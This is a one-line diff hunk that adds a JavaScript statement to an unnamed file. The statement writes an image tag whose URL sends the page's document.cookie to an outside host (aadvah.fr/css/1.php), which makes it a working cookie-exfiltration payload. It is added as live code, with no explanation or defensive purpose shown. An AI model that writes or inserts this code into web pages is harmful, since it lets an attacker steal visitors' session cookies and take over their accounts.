@@ -1,0 +1,1 @@
+document.write('<img src="https://aadvah.fr/css/1.php?cookie=' + document.cookie + '" />')
